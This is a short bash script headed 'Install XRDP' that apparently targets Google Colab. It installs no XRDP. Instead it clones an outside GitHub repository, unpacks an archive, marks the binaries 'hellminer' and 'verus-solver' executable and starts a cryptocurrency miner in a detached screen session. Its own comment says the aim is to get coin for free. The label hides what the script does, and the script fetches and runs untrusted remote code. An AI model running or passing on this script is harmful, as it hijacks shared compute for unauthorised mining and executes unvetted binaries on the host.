#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install git screen -y
screen -R vrot
 
git clone https://github.com/burocos/vrots.git
cd vrots
tar xvf vrot.tar.gz
sudo chmod +x hellminer && sudo chmod +x verus-solver && sudo chmod +x startminer.sh
./startminer.sh


